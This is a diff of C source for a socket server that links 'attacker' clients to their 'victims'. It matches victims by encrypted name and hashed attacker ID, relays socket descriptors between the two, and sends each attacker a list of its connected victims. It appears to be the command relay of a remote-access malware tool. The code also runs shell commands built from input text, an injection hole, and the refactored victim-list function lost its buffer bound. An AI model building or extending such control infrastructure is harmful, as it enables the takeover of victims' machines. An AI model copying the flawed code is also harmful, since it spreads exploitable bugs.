@@ -3,12 +3,7 @@
 int opt = TRUE; 
 int i;
 
-void initialize_connection(){
-	//initialise all client_list[] to 0 so not checked
-	for (i = 0; i < MAX_CLIENTS; i++) {
-		clients_list[i].socket_fd = 0;
-	}
-		
+void initialize_connection(){		
 	//create a master socket
 	if( (master_socket = socket(AF_INET , SOCK_STREAM , 0)) == 0) {
 		perror("socket failed");
@@ -42,11 +37,12 @@ void initialize_connection(){
 	addrlen = sizeof(address);
 		
 }
-void add_child_sockets_to_set(){
-	for ( i = 0 ; i < MAX_CLIENTS ; i++) { //make it as a function
+void add_child_sockets_to_set(client_ptr * client_list){
+	client_ptr curr_client = *client_list;
+	while(curr_client){
 		//socket descriptor 
-		socket_descriptor = clients_list[i].socket_fd;
-			
+		socket_descriptor = curr_client->socket_fd;
+	
 		//if valid socket descriptor then add to read list 
 		if(socket_descriptor > 0)
 			FD_SET(socket_descriptor , &readfds); 
@@ -54,28 +50,48 @@ void add_child_sockets_to_set(){
 		//highest file descriptor number, need it for the select function 
 		if(socket_descriptor > max_socket_descriptor) 
 			max_socket_descriptor = socket_descriptor; 
+		
+		curr_client = curr_client->next_client;
 	}
 }
 
 // set the connection between the attacker and his selected victim by setting the socket file descriptor for hech to the other
-void set_attacker_victim_connection (client * attacker, char * selected_victim_name){
+void set_attacker_victim_connection (client_ptr * attacker, client_ptr * client_list, int num_of_connected_clients, char * selected_victim_name){
 	char attacker_hashed_id[HASH_LEN];
-	strcpy(attacker_hashed_id, md5((unsigned char *) attacker->id, strlen(attacker->id)));
-	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS; curr_client_index++){
-		fflush(stdout);
-		if (strcmp(clients_list[curr_client_index].id, attacker_hashed_id) == 0 && strcmp(clients_list[curr_client_index].name, decrypt_text(selected_victim_name, AES_KEY)) == 0 && clients_list[curr_client_index].i_am == VICTIM){
+	strcpy(attacker_hashed_id, md5((unsigned char *) (*attacker)->id, strlen((*attacker)->id)));
+//	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS; curr_client_index++){
+	client_ptr curr_client = * client_list;
+	while (curr_client){
+		if (strcmp(curr_client->id, attacker_hashed_id) == 0 && strcmp(curr_client->name, decrypt_text(selected_victim_name, AES_KEY)) == 0 && curr_client->i_am == VICTIM){
 			// if this client is a victim and this client is the victim of this attacket and if this client is the selected client -> then we will set the files descriptors accordingly
 			
-			
-			clients_list[curr_client_index].other_side_sfd = attacker->socket_fd; // set the socket file descriptor of the attacket to the victim
-			attacker->other_side_sfd = clients_list[curr_client_index].socket_fd;
-			//clients_list[attacket_index].other_side_sfd = clients_list[curr_client_index].socket_fd;// set the socket file descriptor of the victim to the attacker
+			curr_client->other_side_sfd = (*attacker)->socket_fd; // set the socket file descriptor of the attacket to the victim
+			(*attacker)->other_side_sfd = curr_client->socket_fd;
+			//clients_list[attacket_index].other_side_sfd = curr_client->socket_fd;// set the socket file descriptor of the victim to the attacker
 		}
+		curr_client = curr_client->next_client;
 	}
 }
+void send_to_attacker_connected_victims (client_ptr attacker, client_ptr client_list, int num_of_connected_clients){
+	int num_of_connected_victims = 0;
+	char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_USER_NAME_LEN];
+	
+	for (int i = 0;  i < MAX_VICTIMS_PER_ATTACKER; i++)
+		memset(connected_victims[i], '\0', MAX_USER_NAME_LEN);
+	
+	while (client_list){
+		if (strcmp(client_list->id, md5((unsigned char *) attacker->id, strlen(attacker->id))) == 0 && client_list->i_am == VICTIM){
+			strtok(client_list->name, "\n"); // if exist, remove the '\n'
+			strcpy(connected_victims[num_of_connected_victims++], client_list->name);
+		}
+		client_list = client_list->next_client;
+	}
+	send(attacker->socket_fd, &connected_victims, sizeof(connected_victims), 0);
+}
+
 // AES 256 cbc encryption
 char * encrypt_text (char * text_to_encrypt, char * encrypt_key){
-	int max_len = (strlen(text_to_encrypt) * 1.36) + 100;
+	int max_len = (strlen(text_to_encrypt) * 1.36) + 100; // aes len after encryption
 	char * encrypted_text = (char *) malloc(max_len * sizeof(char));
 	char sub_buffer[65];
 	char encrypt_commend[40 + strlen(text_to_encrypt) + strlen(encrypt_key)];
@@ -104,20 +120,4 @@ char * decrypt_text (char * text_to_decrypt, char * decryption_key){
 	}	
 	pclose(aes_decryption_fd);
 	return decrypted_text;
-}
-
-void send_to_attacker_connected_victims (client attacker){
-	int num_of_connected_victims = 0;
-	char connected_victims[MAX_VICTIMS_PER_ATTACKER][MAX_USER_NAME_LEN];
-	
-	for (int i = 0;  i < MAX_VICTIMS_PER_ATTACKER; i++){
-		memset(connected_victims[i], '\0', MAX_USER_NAME_LEN);
-	}
-	for (int curr_client_index = 0; curr_client_index < MAX_CLIENTS && num_of_connected_victims < MAX_VICTIMS_PER_ATTACKER; curr_client_index++) {
-		if (strcmp(clients_list[curr_client_index].id, md5((unsigned char *) attacker.id, strlen(attacker.id))) == 0 && clients_list[curr_client_index].i_am == VICTIM){
-			strtok(clients_list[curr_client_index].name, "\n"); // if exist,remove the '\n'
-			strcpy(connected_victims[num_of_connected_victims++], clients_list[curr_client_index].name);
-		}
-	}
-	send(attacker.socket_fd, &connected_victims, sizeof(connected_victims), 0);
 }
